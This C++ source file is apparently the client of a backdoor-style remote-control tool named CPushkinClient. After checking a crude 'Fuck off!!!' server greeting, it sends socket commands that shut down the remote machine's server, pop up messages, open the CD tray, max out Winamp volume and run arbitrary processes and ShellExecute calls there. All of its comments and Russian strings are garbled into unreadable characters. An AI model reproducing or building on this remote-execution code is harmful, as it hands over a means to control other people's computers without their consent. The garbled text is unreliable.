// ���������� ������ CPushkinClient
#include <iostream>
#include "client.h"
#include "commands.h"
#include "common.h"

#pragma warning (disable: 4996)

using namespace PUSHKIN_CLIENT;
using namespace std;

//////////////////////////////////////////////////////////////////////////////
// ��������� �������
//////////////////////////////////////////////////////////////////////////////

// ��������� ����������� �� �������
int CPushkinClient::ReceiveGreeting()
{
   m_err_code = 0;

   char buf[64];
   int len = recv(m_socket, buf, 64, 0);
   if (len == SOCKET_ERROR)
      return P_ERROR;

   // �� ������ �������� �����: "Fuck off!!!"
   const char *fuck = "Fuck off!!!";
   const char *hello_error = "��������� ����������� �������";
   if (len != strlen(fuck))
   {
      m_err_msg = hello_error;
      return P_ERROR;
   }

   buf[len] = 0;

   if (strcmp(buf, fuck) != 0)
   {
      m_err_msg = hello_error;
      return P_ERROR;
   }

   return P_YES;
}

// �������� �������
int CPushkinClient::SendCommand(UINT code)
{
   m_err_code = 0;
   if (send(m_socket, (char*)&code, sizeof(code), 0) == SOCKET_ERROR)
   {
      m_err_code = 0;
      m_err_msg = "������ ������� ������� �������";
      return P_ERROR;
   }

   return P_YES;
}

// ���������� ������� �, ��������������, �������������� ����������
int CPushkinClient::ShutdownServer()
{
   m_err_code = 0;

   // �������� ������� �������
   if (SendCommand(SC_SHUTDOWN_SERVER) != P_YES)
      return P_ERROR;  // ������ ��� ���������

   // ��������� �������������
   UINT err_code;
   int ret = IsConfirmed(m_socket, err_code);
   if (ret == P_ERROR) return P_ERROR;
   if (ret == P_NO)
   {
      m_err_code = err_code;
      m_err_msg  = "���������� ���������� ������. ";
      m_err_msg += GetErrorText(err_code); 
      return P_ERROR;
   }

   Disconnect();

   return P_YES;
}

// ��������� ������ �������
int CPushkinClient::GetServerVersion(UINT &ver)
{
   m_err_code = 0;

   // �������� ������� �������
   if (SendCommand(SC_GETVERSION) != P_YES) return P_ERROR;

   // ��������� �������������
   UINT err_code;
   int ret = IsConfirmed(m_socket, err_code);
   if (ret == P_ERROR) return P_ERROR;
   if (ret == P_NO)
   {
      m_err_code = err_code;
      m_err_msg  = "������ ��������� ������ �������. ";
      m_err_msg += GetErrorText(err_code);
      return P_ERROR;
   }

   // ��������� ����� ������
   if (ReceiveUINT(m_socket, ver) != P_YES)
   {
      m_err_msg  = err_getting_data;
      return P_ERROR;
   }

   return P_YES;
}

// ������� ��������� ������� (����� �� ������)
int CPushkinClient::SendMessage(const char *message, const char *caption, int flags, int b_async)
{
   // b_async - ������� ������������ ���������
   m_err_code = 0;
   m_err_msg  = NULL;
   if (!message)
   {
      m_err_msg = "������ ������� ��������� �� ������: ��������� ������";
      return P_ERROR;
   }

   // ���� ������� �������
   if (SendCommand(SC_SHOW_MESSAGE) != P_YES) return P_ERROR;  // ������ ��� ��������� ������

   // �������� ������������� ������� ������ ���������
   UINT err_code;
   int ret = IsConfirmed(m_socket, err_code);
   if (ret == P_NO)
   {
      m_err_code = err_code;
      m_err_msg  = "������ ������� ��������� �� ������. ";
      m_err_msg += GetErrorText(err_code);
      return P_ERROR;
   }

   // ����� �������� ����� ���������,���������,����� � ������� �������������
   if (SendString(m_socket, (String)message) != P_YES) return P_ERROR;
   if (SendString(m_socket, (String)caption) != P_YES) return P_ERROR;
   if (SendUINT(m_socket, (UINT)flags) != P_YES) return P_ERROR;
   if (SendUINT(m_socket, (UINT)b_async) != P_YES) return P_ERROR;

   // �������� ������������� ������ ���������
   // (���� ��� �����������, �� �� ������� ������������� �����, ����� ������ ����� ��� ���������)
   ret = IsConfirmed(m_socket, err_code);
   if (ret == P_NO)
   {
      m_err_code = err_code;
      m_err_msg  = "������ ��������� �� ������ �������. ";
      m_err_msg += GetErrorText(err_code);
      return P_ERROR;
   }
   return ret;
}

// ������� ������ CD-ROM
int CPushkinClient::OpenCDDoor(UINT b_open)
{
   m_err_code = 0;

   // �������� ������� �� �������� ��� �������� CD-ROM'a
   if (SendCommand(SC_OPEN_CD_DOOR) != P_YES) return P_ERROR;
   if (SendUINT(m_socket, b_open) != P_YES) return P_ERROR;

   // �������� �������������
   UINT err_code;
   int ret = IsConfirmed(m_socket, err_code);
   if (ret == P_NO)
   {
      m_err_code = err_code;
      m_err_msg  = "�� ���� ������� ����� CD-ROM'a. ";
      m_err_msg += GetErrorText(err_code);
      return P_ERROR;
   }

   return P_YES;
}

// ��������� ������� �� �������
int CPushkinClient::ServCreateProcess(const char *cmd_line, const char *working_dir)
{
   m_err_code = 0;

   if (!cmd_line)
   {
      m_err_msg = "���������� ������� �������. ������ ��������� ������";
      return P_ERROR;
   }

   // �������� ������� �� �������� ��� �������� CD-ROM'a
   if (SendCommand(SC_CREATE_PROCESS) != P_YES) return P_ERROR;

   // �������� �������������
   UINT err_code;
   int ret = IsConfirmed(m_socket, err_code);
   if (ret == P_NO)
   {
      m_err_code = err_code;
      m_err_msg  = "���������� ������� �������. ";
      m_err_msg += GetErrorText(err_code);
      return P_ERROR;
   }

   // �������� ���������
   if (SendString(m_socket, (String)cmd_line) != P_YES) return P_ERROR;
   if (SendString(m_socket, (String)working_dir) != P_YES) return P_ERROR;

   // �������� �������������
   ret = IsConfirmed(m_socket, err_code);
   if (ret == P_NO)
   {
      m_err_code = 0;
      m_err_msg  = "���������� ������� �������. ";
      m_err_msg += GetErrorText(err_code);
      return P_ERROR;
   }
   return P_YES;
}

// ��������� ���� Winamp'a �� ���������
int CPushkinClient::MaximizeWinampVolume()
{
   m_err_code = 0;

   // �������� ������� ��� ���������� ����� Winamp'a �� ���������
   if (SendCommand(SC_MAX_WINAMP_VOL) != P_YES) return P_ERROR;

   // �������� �������������
   UINT err_code;
   int ret = IsConfirmed(m_socket, err_code);
   if (ret == P_NO)
   {
      m_err_code = err_code;
      m_err_msg  = "���������� ��������������� ���� Winamp'a. ";
      m_err_msg += GetErrorText(err_code);
      return P_ERROR;
   }

   return P_YES;
}

// ���������� ������� ShellExecute �� �������
int CPushkinClient::ServShellExecute(const char *operation, const char *file, const char *dir)
{
   m_err_code = 0;

   if (!operation || !file || !dir)
   {
      m_err_msg = "������ ���������� ������� ShellExecute: ������� ���������";
      return P_ERROR;
   }

   // �������� ������� � �������� �������������
   if (SendCommand(SC_SHELL_EXECUTE) != P_YES) return P_ERROR;

   // �������� �������������
   UINT err_code;
   int ret = IsConfirmed(m_socket, err_code);
   if (ret == P_NO)
   {
      m_err_code = err_code;
      m_err_msg  = "���������� ��������� ������� ShellExecute �� �������. ������ ";
      m_err_msg += GetErrorText(err_code);
      return P_ERROR;
   }

   // �������� ��� ������-���������
   if (SendString(m_socket, (String)operation) != P_YES) return P_ERROR;
   if (SendString(m_socket, (String)file) != P_YES) return P_ERROR;
   if (SendString(m_socket, (String)dir) != P_YES) return P_ERROR;

   // �������� ������������� ���������� �������
   ret = IsConfirmed(m_socket, err_code);
   if (ret == P_NO)
   {
      m_err_code = err_code;
      m_err_msg  = "���������� ��������� ������� ShellExecute �� �������. ������ ";
      m_err_msg += GetErrorText(err_code);
      return P_ERROR;
   }

   return P_YES;
}

// ��������� ���������� ����� �� �������
int CPushkinClient::GetServFreeSpace(const char *path_in, __int64 &free_space)
{
   m_err_code = 0;
   m_err_msg = "";
   if (!path_in) return P_ERROR;

   // ����� ������ ������ ��������� 3 �������
   if (strlen(path_in)<3) return P_ERROR;

   // ����� �������� ��������� ����� ����
   String path = path_in;
   char *str_p = (char*)path.c_str();
   str_p[3] = 0;  // �������� ������� ����

   // �������� ������� �� ��������� ���������� �����
   if (SendCommand(SC_GET_FREE_SPACE) != P_YES) return P_ERROR;

   // ��������� ������������� ���������� ������� ���������
   UINT err_code;
   int ret = IsConfirmed(m_socket, err_code);
   if (ret == P_NO)
   {
      m_err_code = err_code;
      m_err_msg  = "���������� ��������� ������� GetDiskFreeSpace. ";
      m_err_msg += GetErrorText(err_code);
      return P_ERROR;
   }

   // ����� �������� ��������
   if (SendString(m_socket, path) != P_YES) return P_ERROR;

   // ��������� ������������� ���������� �������
   ret = IsConfirmed(m_socket, err_code);
   if (ret == P_NO)
   {
      m_err_code = err_code;
      m_err_msg  = "���������� ��������� ������� GetDiskFreeSpace2. ";
      m_err_msg += GetErrorText(err_code);
      return P_ERROR;
   }

   // ��������� ��� ���������
   UINT sec_per_clust;
   UINT bytes_per_sect;
   UINT num_of_free_clust;
   UINT tot_num_of_clust;

   if (ReceiveUINT(m_socket, sec_per_clust)     != P_YES) return P_ERROR;
   if (ReceiveUINT(m_socket, bytes_per_sect)    != P_YES) return P_ERROR;
   if (ReceiveUINT(m_socket, num_of_free_clust) != P_YES) return P_ERROR;
   if (ReceiveUINT(m_socket, tot_num_of_clust)  != P_YES) return P_ERROR;

   free_space = num_of_free_clust;
   free_space *= sec_per_clust;
   free_space *= bytes_per_sect;

   return P_YES;
}
